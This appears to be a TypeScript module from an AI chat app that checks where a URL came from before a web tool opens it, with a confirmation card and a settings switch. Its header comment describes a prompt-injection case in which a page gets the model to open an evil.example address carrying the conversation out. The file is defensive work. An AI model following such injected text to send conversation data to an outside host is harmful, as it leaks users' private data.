// Where a web address came from, and whether a tool may open it unasked
// (P-L, 3.1.0, David 09.11.2026: "standard streng mit Option es auszuschalten").
//
// A web tool reads an address the model hands it. A page the model read can
// ask it to open `https://evil.example/?d=<the conversation>`, and the request
// itself carries the data out. So by default a web tool opens, without asking,
// only an address that
//
// - the user wrote in this conversation, or lies on a site the user named, or
// - stood in what a web tool brought back in this conversation (a search
//   result, a source, a link of a page or of the browser).
//
// Such an address was chosen by the user or by a page, never assembled by the
// model, so it cannot carry anything out of the conversation. Every other
// address gets a card. Settings → "Ask before unknown web addresses"
// (`webStrictUrls`) turns the card off.

// The stores are loaded when the gate runs, not with this module: the tool
// catalog imports it, and the chat store pulls half the app in behind it.
import type { AgentRunContext } from '../api/agent-context'
import { isMobile } from './device-kind'
import { isPhoneTurn } from './remote-turn-caps'

const URL_IN_TEXT = /https?:\/\/[^\s<>"'`)\]}]+/gi
/** Tools whose results are web content (their links were chosen by a page). */
const WEB_TOOLS = new Set(['web_search', 'web_fetch', 'web_research', 'browser_open', 'browser_snapshot', 'browser_scroll', 'browser_click_link'])

/** Lower-case host, no fragment, no trailing slash, `www.` kept apart from nothing. */
export function normalizeUrl(raw: string): string | null {
  try {
    const u = new URL(raw.trim().replace(/[.,;:!?]+$/, ''))
    if (u.protocol !== 'http:' && u.protocol !== 'https:') return null
    u.hash = ''
    let s = u.toString()
    if (s.endsWith('/') && u.pathname !== '/') s = s.slice(0, -1)
    return s
  } catch {
    return null
  }
}

function hostOf(url: string): string {
  try {
    return new URL(url).hostname.toLowerCase().replace(/^www\./, '')
  } catch {
    return ''
  }
}

export function urlsInText(text: string | undefined | null): string[] {
  if (!text) return []
  const out: string[] = []
  for (const m of text.matchAll(URL_IN_TEXT)) {
    const n = normalizeUrl(m[0])
    if (n) out.push(n)
  }
  return out
}

/** What a conversation has seen: addresses of web results, and what the user wrote. */
export interface Provenance {
  /** Exact addresses from web tool results. */
  seen: Set<string>
  /** Exact addresses the user wrote. */
  userUrls: Set<string>
  /** Hosts the user named, by address or bare (`heise.de`). */
  userHosts: Set<string>
}

/** Addresses brought in this session, per conversation (also for surfaces whose store this module does not read). */
const remembered = new Map<string, Set<string>>()

export function rememberUrls(conversationId: string | null | undefined, urls: Iterable<string>): void {
  const key = conversationId || '_'
  let set = remembered.get(key)
  if (!set) {
    set = new Set()
    remembered.set(key, set)
  }
  for (const u of urls) {
    const n = normalizeUrl(u)
    if (n) set.add(n)
  }
}

const BARE_HOST = /\b((?:[a-z0-9-]+\.)+[a-z]{2,24})\b/gi

/** Collect what the user wrote and what web tools answered in this conversation. */
export function provenanceFrom(userTexts: string[], webResults: string[], extra: Iterable<string> = []): Provenance {
  const p: Provenance = { seen: new Set(), userUrls: new Set(), userHosts: new Set() }
  for (const t of userTexts) {
    for (const u of urlsInText(t)) {
      p.userUrls.add(u)
      p.userHosts.add(hostOf(u))
    }
    for (const m of t.matchAll(BARE_HOST)) {
      const h = m[1].toLowerCase().replace(/^www\./, '')
      // "z.B." and file names are no hosts; a known top-level ending is not checked here, a host the user typed is enough.
      if (!/\.(?:txt|md|json|ts|tsx|js|py|rs|png|jpg|pdf|zip|exe)$/.test(h)) p.userHosts.add(h)
    }
  }
  for (const r of webResults) for (const u of urlsInText(r)) p.seen.add(u)
  for (const u of extra) {
    const n = normalizeUrl(u)
    if (n) p.seen.add(n)
  }
  return p
}

export type UrlVerdict = { ok: true } | { ok: false; reason: string }

/** The rule, pure. */
export function judgeUrl(raw: string, p: Provenance): UrlVerdict {
  const url = normalizeUrl(raw)
  if (!url) return { ok: false, reason: 'This is no http(s) address.' }
  if (p.userUrls.has(url) || p.seen.has(url)) return { ok: true }
  // Same address with or without the trailing slash, http or https.
  const alt = url.replace(/^http:/, 'https:')
  if (p.seen.has(alt) || p.userUrls.has(alt)) return { ok: true }
  const host = hostOf(url)
  if (host && p.userHosts.has(host)) return { ok: true }
  return { ok: false, reason: 'The address was not written by you and did not appear in any web result of this conversation. The model put it together itself, and an address can carry text out of the chat.' }
}

/** User words and web tool results of one stored conversation. */
async function conversationTexts(conversationId: string | null): Promise<{ user: string[]; web: string[] }> {
  const user: string[] = []
  const web: string[] = []
  if (!conversationId) return { user, web }
  try {
    const { useChatStore } = await import('../stores/chatStore')
    const conv = useChatStore.getState().conversations.find((c) => c.id === conversationId)
    for (const m of conv?.messages ?? []) {
      if (m.role === 'user') {
        user.push(m.content)
        if (m.displayContent) user.push(m.displayContent)
      }
      for (const b of m.agentBlocks ?? []) {
        for (const tc of b.toolCalls ?? (b.toolCall ? [b.toolCall] : [])) {
          if (WEB_TOOLS.has(tc.toolName) && typeof tc.result === 'string') web.push(tc.result)
        }
      }
    }
  } catch {
    // No store (tests, a worker): only what was remembered counts.
  }
  return { user, web }
}

/**
 * The gate a web tool calls before it opens an address. `null` means go on;
 * a string is the tool's answer to the model (the user said no).
 */
export async function guardWebUrl(
  url: string,
  tool: string,
  run: AgentRunContext | undefined,
  signal?: AbortSignal,
  latestUserText?: string,
): Promise<string | null> {
  const { useSettingsStore } = await import('../stores/settingsStore')
  const strict = useSettingsStore.getState().settings.webStrictUrls !== false
  if (!strict) return null
  const convId = run?.conversationId ?? null
  const { user, web } = await conversationTexts(convId)
  if (latestUserText) user.push(latestUserText)
  const p = provenanceFrom(user, web, [...(remembered.get(convId || '_') ?? []), ...(remembered.get('_') ?? [])])
  const verdict = judgeUrl(url, p)
  if (verdict.ok) return null
  // No card can be drawn on the phone (its tool rows have none) or for a call
  // outside a chat run (a workflow step): there the model is told to ask, and
  // nothing waits for a click that cannot come.
  // A turn the paired phone started in a shared chat is the same case: the
  // card would stand at the computer while the user waits at the phone.
  if (isMobile() || !run || isPhoneTurn(convId)) {
    return `Error: ${url} was not given by the user and did not appear in a web result of this conversation, so it was not opened. Ask the user to send the link if they want it read.`
  }
  const { useWebUrlConfirmStore } = await import('../stores/webUrlConfirmStore')
  const allowed = await useWebUrlConfirmStore.getState().ask(
    {
      id: `web-url-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
      toolCallId: run?.toolCallId,
      conversationId: convId,
      tool,
      url,
      reason: verdict.reason,
    },
    signal ?? run?.abortSignal,
  )
  if (allowed) {
    rememberUrls(convId, [url])
    return null
  }
  return `Error: The user did not allow opening ${url}. Only open addresses the user gave or that appeared in web results of this conversation.`
}
